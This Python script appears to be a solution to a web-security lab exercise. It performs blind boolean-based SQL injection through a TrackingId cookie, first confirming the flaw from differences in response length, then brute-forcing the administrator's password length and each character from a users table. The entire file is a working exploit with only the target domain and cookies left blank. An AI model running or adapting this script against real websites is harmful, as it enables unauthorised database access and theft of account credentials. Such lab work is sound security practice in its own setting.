import requests
import urllib.parse


def send_request(url, session, tracking_id, injection_payload):
  headers = {"Cookie": f"TrackingId={tracking_id}{injection_payload}; session={session}"}
  test_request = requests.get(url, headers = headers)
  return test_request.headers['Content-Length']


def test_vuln(url, session, tracking_id):
  true_response = send_request(url, session, tracking_id, urllib.parse.quote("' AND 1=1--"))
  false_response = send_request(url, session, tracking_id, urllib.parse.quote("' AND 1=2--"))
  if true_response == false_response:
    print("site is not vulnerable")
    return [False, None, None]
  
  return [True, true_response, false_response]


def get_password_length(url, session, tracking_id, max_length, false_response):
  for length in range(1, max_length+1):
    injection_paylaod = f"' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > {length}) = 'administrator'--"
    response = send_request(url, session, tracking_id, urllib.parse.quote(injection_paylaod))
    if response == false_response:
      return [True, length]
  
  print("failed to brute force the password length")
  return [False, None]


def get_password(url, session, tracking_id, password_length, characters, true_response):
  password = ""
  for position in range(1, password_length+1):
    for character in characters:
      injection_paylaod = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{character}'--"
      response = send_request(url, session, tracking_id, urllib.parse.quote(injection_paylaod))
      if response == true_response:
        password += character
        print(f"{position}/{password_length} characters...")
        continue
      if len(password) == password_length:
        return [True, password]
  
  print("failed to brute force the password")
  return [False, None]


def main():
  DOMAIN = ""
  URL = f"https://{DOMAIN}/filter?category=category"
  SESSION_COOKIE = ''
  TRACKINGID_COOKIE = ''
  CHARACTERS = 'abcdefghijklmnopqrstuvwxyz0123456789'

  (is_vulnerable, true_response, false_response) = test_vuln(URL, SESSION_COOKIE, TRACKINGID_COOKIE)
  if not is_vulnerable:
    return
  print("site is vulnerable")

  (got_password_length, password_length) = get_password_length(URL, SESSION_COOKIE, TRACKINGID_COOKIE, 50, false_response)
  if not got_password_length:
    return
  print(f"the password length is {password_length}")

  (got_password, password) = get_password(URL, SESSION_COOKIE, TRACKINGID_COOKIE, password_length, CHARACTERS, true_response)
  if got_password:
    print(password)


if __name__ == "__main__":
  main()
